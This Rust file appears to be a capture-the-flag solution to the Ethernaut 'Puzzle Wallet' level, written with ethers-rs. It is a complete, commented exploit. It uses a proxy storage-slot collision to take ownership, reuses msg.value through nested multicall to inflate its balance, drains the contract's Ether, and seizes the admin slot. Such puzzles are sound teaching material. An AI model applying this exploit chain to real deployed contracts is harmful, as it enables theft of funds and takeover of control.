use crate::types::*;
use crate::utils;
use ethers::prelude::*;
use ethers::utils::{compile, Solc};
use ethers_core::utils::WEI_IN_ETHER;
use hex::ToHex;
use std::error::Error;
use std::sync::Arc;

abigen!(
    LevelContract,
    r#"[
        function proposeNewAdmin(address) external
        function addToWhitelist(address) external
        function multicall(bytes[] calldata) external payable
        function execute(address, uint256, bytes calldata) external payable
        function setMaxBalance(uint256) external
    ]"#,
);

pub async fn solve(level: &Level, config: &EnvironmentConfig) -> Result<(), Box<dyn Error>> {
    let client = Arc::new(utils::create_signer_middleware(
        config.wallet_mnemonic_path.clone(),
        config.network.chain_id,
        config.network.rpc.clone(),
    )?);

    let level_address = level.instance.parse::<Address>()?;
    let level_contract = LevelContract::new(level_address, client.clone());

    // Set `pendingAdmin` (slot 0) to our address, when delegatecall PuzzleWallet, `owner` (slot 0)
    // will be our address, too.
    let address = client.default_sender().unwrap();
    let receipt = level_contract
        .propose_new_admin(address)
        .legacy()
        .send()
        .await?
        .await?;
    println!(
        "propose_new_admin():\n{}",
        serde_json::to_string_pretty(&receipt)?
    );

    // Since `owner` is our address now, we can add ourself to the whitelist to get through
    // `onlyWhitelisted` check.
    let receipt = level_contract
        .add_to_whitelist(address)
        .legacy()
        .send()
        .await?
        .await?;
    println!(
        "add_to_whitelist():\n{}",
        serde_json::to_string_pretty(&receipt)?
    );

    // Now, it is tempting to call `setMaxBalance` to set `maxBalance` (slot 1) to our address so
    // that in `PuzzleProxy`'s view, `admin` (slot 1) will be our address. However, there's a check
    // that requires the balance of the contract to be 0. We need to find a way to drain the
    // contract.

    let compiled = compile(Solc::new("./contracts/**/*.sol")).await?;
    let _level_contract = compiled
        .get("PuzzleWallet")
        .expect("could not find PuzzleWallet contract");
    let deposit_sig: Bytes = _level_contract
        .abi
        .function("deposit")?
        .short_signature()
        .to_vec()
        .into();
    println!(
        "function signature of deposit(): {}",
        deposit_sig.encode_hex::<String>()
    );

    let calldata = level_contract
        .multicall(vec![deposit_sig.to_vec()])
        .legacy()
        .calldata()
        .unwrap();
    println!(
        "calldata of multicall(deposit_sig): {}",
        calldata.encode_hex::<String>()
    );

    // Use `multicall` to call `deposit` once, then call another `multicall` to call `deposit` the
    // second time. This way, we can get pass the "Protect(ion) against reusing msg.value" and set
    // our balance in the contract to 2 while only sending 1 Ether.
    let receipt = level_contract
        .multicall(vec![deposit_sig.to_vec(), calldata.to_vec()])
        .legacy()
        .value(WEI_IN_ETHER)
        .send()
        .await?
        .await?;
    println!("multicall():\n{}", serde_json::to_string_pretty(&receipt)?);

    // Drain the contract.
    let receipt = level_contract
        .execute(address, U256::from_dec_str("2")? * WEI_IN_ETHER, vec![])
        .legacy()
        .send()
        .await?
        .await?;
    println!("execute():\n{}", serde_json::to_string_pretty(&receipt)?);

    // Finally, set `maxBalance`/`admin`/slot 1 to our address.
    let receipt = level_contract
        .set_max_balance(utils::address_to_uint256(address))
        .legacy()
        .send()
        .await?
        .await?;
    println!(
        "set_max_balance():\n{}",
        serde_json::to_string_pretty(&receipt)?
    );

    Ok(())
}
